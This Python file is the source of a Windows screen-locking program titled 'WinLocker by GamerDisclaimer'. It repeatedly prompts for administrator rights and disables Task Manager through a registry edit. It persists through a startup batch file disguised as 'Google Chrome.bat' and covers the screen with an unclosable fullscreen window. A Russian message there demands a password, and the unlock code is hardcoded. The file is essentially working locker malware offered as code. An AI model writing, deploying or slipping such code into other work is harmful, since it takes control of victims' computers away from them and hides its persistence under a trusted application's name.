import subprocess

import playsoundsimple
from playsoundsimple import *
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
import ctypes, sys
from threading import Thread

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def start_WS():
    USER_NAME = getpass.getuser()

    window = Tk()
    window.title("WinLocker by GDisclaimer")
    window.geometry('400x250')
    window['bg'] = 'black'

    # Base size
    normal_width = 1920
    normal_height = 1080

    # Get screen size
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()

    # Get percentage of screen size from Base size
    percentage_width = screen_width / (normal_width / 100)
    percentage_height = screen_height / (normal_height / 100)

    # Make a scaling factor, this is bases on average percentage from
    # width and height.
    scale_factor = ((percentage_width + percentage_height) / 2) / 100

    # Set the fontsize based on scale_factor,
    # if the fontsize is less than minimum_size
    # it is set to the minimum size

    fontsize = int(20 * scale_factor)
    minimum_size = 10
    if fontsize < minimum_size:
        fontsize = minimum_size

    fontsizeHding = int(72 * scale_factor)
    minimum_size = 40
    if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size

    # Create a style and configure for ttk.Button widget
    default_style = ttk.Style()
    default_style.configure('New.TButton', font=("Helvetica", fontsize))

    def play(test):
        # sound = playsoundsimple.Sound('9a49e1c170bd8c1.mp3')
        # sound.play()
        pass

    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def block():
        pyautogui.moveTo(x=680, y=800)
        window.protocol("WM_DELETE_WINDOW", block)
        window.update()

    def fullscreen():
        window.attributes('-fullscreen', True, '-topmost', True)

    def clicked():
        res = format(txt.get())
        if res == 'petya':
            file_path = '/tmp/file.txt'
            file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
            os.remove(file_path)
            os.system(
                "REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
            sys.exit()

    os.system(
        "REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    add_to_startup(__file__)
    fullscreen()
    print(__name__)

    txt_one = Label(window, text='WinLocker by GamerDisclaimer', font=("Arial Bold", fontsizeHding), fg='red',
                    bg='black')
    txt_two = Label(window, text='Сорри, бро :(', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_three = Label(window,
                      text='Ваш компьютер был заблокирован винлокером. Пожалуйста, введите пароль для получения доступа к компьютеру!',
                      font=("Arial Bold", fontsize), fg='white', bg='black')

    txt_one.grid(column=0, row=0)
    txt_two.grid(column=0, row=0)
    txt_three.grid(column=0, row=0)

    txt_one.place(relx=.01, rely=.01)
    txt_two.place(relx=.01, rely=.11)
    txt_three.place(relx=.01, rely=.21)

    txt = Entry(window)
    btn = Button(window, text="ВВОД КОДА", command=clicked)
    txt.place(relx=.28, rely=.5, relwidth=.3, relheight=.06)
    btn.place(relx=.62, rely=.5, relwidth=.1, relheight=.06)

    block()

    play('sound.mp3')

    window.mainloop()


def start():
    while True:
        if is_admin():

            start_WS()
        else:
            path = os.path.dirname(__file__)
            number = 0
            result = -1
            for i in range(len(path)):
                if path[::-1][i] == "\\":
                    number += 1
                if number == 2:
                    result = -(i + 1)
                    break
            result_path = path[:result] + "\\Scenes\\bad_scene\\WL.py"
            result_path = path + "\\WL.py"
            print(result_path, path, __file__)
            # Re-run the program with admin rights
            # access = Thread(target=lambda: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1))
            # access.start()
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            # if access.is_alive():
            #     access._tstate_lock.release()
            #     access._stop()
            #     access.run()
            #     sleep(2)

if __name__ == "__main__":
    import os
    from ctypes import *

    x = (windll.user32.GetSystemMetrics(0)) // 8
    y = (windll.user32.GetSystemMetrics(1)) // 8
    os.system('mode con cols=' + str(x) + ' lines=' + str(y))
    print("AHAHAHAHHAHAHAHAAHAHAH" * 100000)
    start()
